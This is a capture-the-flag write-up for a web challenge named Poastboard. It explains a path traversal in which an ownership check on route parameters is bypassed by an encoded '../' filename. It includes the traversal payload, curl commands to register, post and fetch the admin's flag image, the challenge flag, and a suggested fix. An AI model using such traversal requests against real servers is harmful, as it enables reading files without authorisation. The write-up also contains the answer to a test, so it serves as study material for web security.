# Poastboard - Writeup

`Poastboard` is a web challenge with a seeded admin post that stores a flag image in the uploads tree. The intended bug is a path traversal in the upload-serving route: the handler checks ownership using the route parameters, but the final filesystem path is built from those parameters without rejecting encoded `../` segments in the image filename slot.

## Flag

`RS{4_littl3_p4th_tr4v3rs4l_4s_4_tr34t}`

## Summary

The exploit flow is:

1. Register a new user.
2. Create any post with any small image so we get a valid upload path we own.
3. Request our own upload URL, but replace the `image` component with:

   `%2e%2e%2f%2e%2e%2fadmin%2f1%2fflag.png`

4. Use `curl --path-as-is` or a raw HTTP client so the encoded path is not normalized away.
5. The server still believes we are reading our own upload, but the final joined path escapes into `uploads/admin/1/flag.png`.

## What Stood Out In The Handout

A few artifacts make the bug direction pretty clear:

- `build/poastboard` is a stripped Go binary, but `strings` still exposes useful route and error text.
- The binary contains these route strings:
  - `GET /api/me`
  - `GET /api/posts`
  - `POST /api/post`
  - `POST /api/login`
  - `POST /api/register`
  - `GET /api/stats`
- It also leaks upload-related strings:
  - `./uploads/%s/%d`
  - `./uploads/uploads/image.png`
  - `file not owned by you`

That strongly suggests uploaded files live under a path shaped like:

```text
./uploads/<username>/<post_id>/<image>
```

and that there is a dedicated authorization check around file ownership.

## Confirming The Seeded Admin Content

Running the challenge locally showed that the database is seeded with one private admin post:

```text
1|1|meow meow|flag.png|...|1
```

and that the corresponding upload lives at:

```text
/app/uploads/admin/1/flag.png
```

The bundled `flag.txt` and local `flag.png` are decoys; the real first flag is in the live seeded admin upload.

## Root Cause

The upload route appears to trust the path prefix for authorization, roughly like this:

```text
/uploads/:username/:post_id/:image
```

If the handler:

1. checks that `:username` matches the logged-in user, and
2. then builds a path like `filepath.Join("./uploads", username, postID, image)`

it is vulnerable if `image` can contain encoded slashes and dot-dot segments.

That is exactly what happens here. The server accepts:

```text
%2e%2e%2f%2e%2e%2fadmin%2f1%2fflag.png
```

as the `image` component, so the final filesystem path resolves to:

```text
./uploads/<our_user>/<our_post_id>/../../admin/1/flag.png
```

which collapses to:

```text
./uploads/admin/1/flag.png
```

The ownership check is satisfied by the route prefix, but the actual file read escapes into the admin directory.

## Manual Exploit

Register and create a harmless post first:

```bash
curl -k -c cookies.txt \
  -d 'username=solver123&password=testpass123' \
  'https://INSTANCE/api/register'

curl -k -b cookies.txt \
  -H 'Content-Type: application/json' \
  --data '{"content":"hello","image":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+aP1cAAAAASUVORK5CYII=","is_private":false}' \
  'https://INSTANCE/api/post'
```

If that returns post id `2`, fetch the admin image with:

```bash
curl -k --path-as-is -b cookies.txt \
  'https://INSTANCE/uploads/solver123/2/%2e%2e%2f%2e%2e%2fadmin%2f1%2fflag.png/' \
  -o flag.png
```

The `--path-as-is` flag matters. Without it, the client may normalize the traversal away before the server ever sees it.

## Solver

The included solver reproduces the whole exploit:

```bash
python3 solve.py 'https://poastboard-b543df0d-2f13-4f68-89df-906175bb8077.ctf.ritsec.club'
```

It will:

1. register a random user,
2. create a post,
3. fetch the admin flag image through the traversal,
4. save the image locally, and
5. print the confirmed flag.

If `tesseract` is available on the host, the script also tries a best-effort OCR pass, but that is optional.

## Why This Works

This is a classic mismatch between:

- authorization based on URL structure, and
- file access based on a later path join.

As soon as those two views of the path disagree, encoded traversal payloads become dangerous. The fix is to reject path separators in user-controlled filename components and to verify ownership only after resolving the final canonical path.
